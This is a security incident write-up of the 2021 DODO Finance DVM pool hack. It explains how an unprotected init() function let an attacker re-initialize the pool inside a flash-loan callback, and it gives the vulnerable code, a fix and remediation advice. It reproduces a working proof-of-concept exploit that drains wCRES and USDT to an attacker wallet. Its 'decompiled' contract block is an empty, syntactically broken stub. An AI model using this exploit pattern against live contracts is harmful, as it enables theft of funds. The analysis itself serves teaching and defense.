# DODO Finance — DVM.init() Re-initialization Flash Loan Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2021-03-09 |
| **Protocol** | DODO Finance |
| **Chain** | Ethereum |
| **Loss** | ~$3,800,000 (wCRES + USDT) |
| **Attacker** | Address unconfirmed |
| **Attack Tx** | Address unconfirmed |
| **Vulnerable Contract** | [0x051EBD717311350f1684f89335bed4ABd083a2b6](https://etherscan.io/address/0x051EBD717311350f1684f89335bed4ABd083a2b6) (DVM Pool) |
| **Root Cause** | DVM.init() function lacks an `initialized` flag, allowing it to be called again at any time |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2021-03/dodo_flashloan_exp.sol) |

---
## 1. Vulnerability Overview

DODO's DVM (Decentralized Virtual Market) pool contract is initialized via the `init()` function. By calling `dvm.init()` again inside the flash loan receive callback (`DVMFlashLoanCall`), the pool's token pair configuration is completely replaced. The attacker borrowed funds via a flash loan, then within the callback used `init()` to reset the pool to a different token pair (tokens controlled by the attacker), bypassing the flash loan repayment validation and stealing the original funds.

---
## 2. Vulnerable Code Analysis

### 2.1 init() — No Initialization Check

```solidity
// ❌ DODO DVM Pool @ 0x051EBD717311350f1684f89335bed4ABd083a2b6
// init() lacks logic to prevent re-calling on an already-initialized pool
function init(
    address maintainer,
    address baseTokenAddress,
    address quoteTokenAddress,
    uint256 lpFeeRate,
    address mtFeeRateModel,
    uint256 i,
    uint256 k,
    bool isOpenTWAP
) external {
    // No initialized flag check
    _BASE_TOKEN_ = IERC20(baseTokenAddress);
    _QUOTE_TOKEN_ = IERC20(quoteTokenAddress);
    _LP_FEE_RATE_ = lpFeeRate;
    // ...
}
```

**Fixed Code**:
```solidity
// ✅ Manage initialization state with a flag
bool private _initialized;

function init(
    address maintainer,
    address baseTokenAddress,
    address quoteTokenAddress,
    uint256 lpFeeRate,
    address mtFeeRateModel,
    uint256 i,
    uint256 k,
    bool isOpenTWAP
) external {
    require(!_initialized, "DVM: already initialized");
    _initialized = true;
    _BASE_TOKEN_ = IERC20(baseTokenAddress);
    _QUOTE_TOKEN_ = IERC20(quoteTokenAddress);
    _LP_FEE_RATE_ = lpFeeRate;
    // ...
}
```

---
### On-chain Original Code

Source: Bytecode decompiled


**DVM Pool_decompiled.sol** — Related contract (vulnerable function Facet not included):
```solidity
// ❌ Root Cause: DVM.init() function lacks an initialized flag, allowing re-call at any time
// ⚠️ Source for the vulnerable function `init()` is not in this file
// (Located in a Diamond pattern Facet or proxy implementation)
// SPDX-License-Identifier: UNLICENSED
// Source unverified — reverse engineered from bytecode
// Original: 0x051EBD717311350f1684f89335bed4ABd083a2b6 (Ethereum)
// Reverse engineering method: function selector extraction + 4byte.directory decoding

pragma solidity ^0.8.0;

contract DVM Pool_Decompiled {
}

```

## 3. Attack Flow

```
┌──────────────────────────────────────────────────────────────┐
│ Step 1: DVM.flashLoan(130000e18 wCRES, 1100000e6 USDT, ...) │
│ DVM Pool @ 0x051EBD717311350f1684f89335bed4ABd083a2b6       │
└─────────────────────┬────────────────────────────────────────┘
                      │ DVMFlashLoanCall() callback entered
┌─────────────────────▼────────────────────────────────────────┐
│ Step 2: dvm.init() re-called inside the callback             │
│ init(maintainer, token1, token2, lpFeeRate, ...)             │
│ → Pool's baseToken/quoteToken replaced with attacker-        │
│   controlled tokens                                          │
└─────────────────────┬────────────────────────────────────────┘
                      │
┌─────────────────────▼────────────────────────────────────────┐
│ Step 3: Original wCRES + USDT transferred to attacker wallet │
│ wCRES_token.transfer(mywallet, balance)                       │
│ usdt_token.transfer(mywallet, balance)                        │
└─────────────────────┬────────────────────────────────────────┘
                      │
┌─────────────────────▼────────────────────────────────────────┐
│ Step 4: Flash loan "repaid" against the re-initialized pool  │
│ — validation passes                                          │
│ (actually repaid with attacker's tokens)                     │
└──────────────────────────────────────────────────────────────┘
```

---
## 4. PoC Code (DeFiHackLabs)

```solidity
// testExploit() — mainnet fork block 12,000,000
function testExploit() public {
    address me = address(this);
    // Initiate flash loan: 130,000 wCRES + 1,100,000 USDT
    dvm.flashLoan(wCRES_amount, usdt_amount, me, "whatever");
}

function DVMFlashLoanCall(address a, uint256 b, uint256 c, bytes memory d) public {
    // Re-call dvm.init() inside flash loan callback — overwrite pool configuration
    dvm.init(
        maintainer,
        token1,   // 0x7f4E7fB900E0EC043718d05caEe549805CaB22C8 (attacker token)
        token2,   // 0xf2dF8794f8F99f1Ba4D8aDc468EbfF2e47Cd7010 (attacker token)
        lpFeeRate,
        mtFeeRateModel,
        i, k, isOpenTWAP
    );
    // Drain original funds
    wCRES_token.transfer(mywallet, wCRES_token.balanceOf(address(this)));
    usdt_token.transfer(mywallet, usdt_token.balanceOf(address(this)));
}
```

---
## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | DVM.init() missing re-initialization protection — anyone can re-call on an already-initialized pool to overwrite the token pair | CRITICAL | CWE-284 |
| V-02 | (Contributing factor) Flash loan callback provides an execution context for attacker code — moot if init() re-call is prevented | LOW | CWE-841 |

> **Root Cause**: The `init()` function lacks an `initialized` flag, allowing it to be called again at any time. The flash loan is merely a funding mechanism for the attack; the same theft would be possible with real capital using only the init() re-call.

---
## 6. Remediation Recommendations

```solidity
// ✅ Restrict init() to a single execution using the initializer pattern
// OpenZeppelin Initializable is recommended

import "@openzeppelin/contracts/proxy/utils/Initializable.sol";

contract DVMPool is Initializable {
    function init(
        address maintainer,
        address baseTokenAddress,
        address quoteTokenAddress,
        uint256 lpFeeRate,
        address mtFeeRateModel,
        uint256 i,
        uint256 k,
        bool isOpenTWAP
    ) external initializer {  // modifier blocks duplicate calls
        _BASE_TOKEN_ = IERC20(baseTokenAddress);
        _QUOTE_TOKEN_ = IERC20(quoteTokenAddress);
        // ...
    }
}
```

---
## 7. Lessons Learned

- **The `init()` function of contracts deployed via proxy or factory patterns must allow only a single invocation.** This is the sole root-cause fix for this incident.
- **Flash loans are a funding mechanism, not the vulnerability.** Preventing the re-call of init() alone would have completely blocked the attack.
- **OpenZeppelin's `Initializable` contract is the standard pattern for addressing this problem.** Use audited libraries instead of custom implementations.